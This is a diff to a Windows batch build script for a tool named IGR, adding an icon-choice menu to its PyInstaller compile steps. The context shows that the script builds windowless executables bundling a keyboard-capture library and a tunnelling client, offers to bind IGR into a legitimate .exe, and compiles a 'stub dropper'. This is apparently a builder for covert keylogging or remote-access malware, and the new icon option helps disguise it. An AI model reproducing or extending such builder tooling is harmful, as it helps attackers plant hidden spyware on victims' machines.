@@ -13,6 +13,19 @@ echo   [1] USB Stick   - Manual deploy via USB (classic)
 echo   [2] EXE Bind    - Merge IGR into a legitimate .exe
 echo.
 set /p "INJECT_MODE=Choose method (1 or 2): "
+
+echo.
+echo   EXE Icon:
+echo   [1] Python   - Default Python icon
+echo   [2] Blank    - No icon (generic Windows exe)
+echo   [3] IGR Logo - Custom IGR logo
+echo.
+set /p "ICON_CHOICE=Choose icon (1, 2 or 3): "
+if "%ICON_CHOICE%"=="1" set "ICON_FLAG="
+if "%ICON_CHOICE%"=="2" set "ICON_FLAG=--icon=blank.ico"
+if "%ICON_CHOICE%"=="3" set "ICON_FLAG=--icon=logos\igr-logo.ico"
+if not defined ICON_FLAG set "ICON_FLAG=--icon=blank.ico"
+
 if "%INJECT_MODE%"=="2" goto :bind_mode
 
 echo.
@@ -99,7 +112,7 @@ if not exist cloudflared.exe (
 
 echo.
 echo [5/6] Compiling igr_v%IGR_VERSION%.exe...
-python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% --icon=blank.ico --clean --noconfirm ^
+python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% %ICON_FLAG% --clean --noconfirm ^
     --hidden-import flask ^
     --hidden-import requests ^
     --hidden-import pynput.keyboard ^
@@ -298,7 +311,7 @@ echo   Done.
 REM Compile IGR exe
 echo.
 echo [4/7] Compiling igr_v%IGR_VERSION%.exe...
-python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% --icon=blank.ico --clean --noconfirm ^
+python -m PyInstaller --onefile --noconsole --name igr_v%IGR_VERSION% %ICON_FLAG% --clean --noconfirm ^
     --hidden-import flask ^
     --hidden-import requests ^
     --hidden-import pynput.keyboard ^
@@ -326,7 +339,7 @@ echo   IGR exe compiled.
 REM Compile stub dropper
 echo.
 echo [5/7] Compiling stub.exe (dropper)...
-python -m PyInstaller --onefile --noconsole --name stub --icon=blank.ico --clean --noconfirm ^
+python -m PyInstaller --onefile --noconsole --name stub %ICON_FLAG% --clean --noconfirm ^
     stub.py
 
 if not exist "dist\stub.exe" (
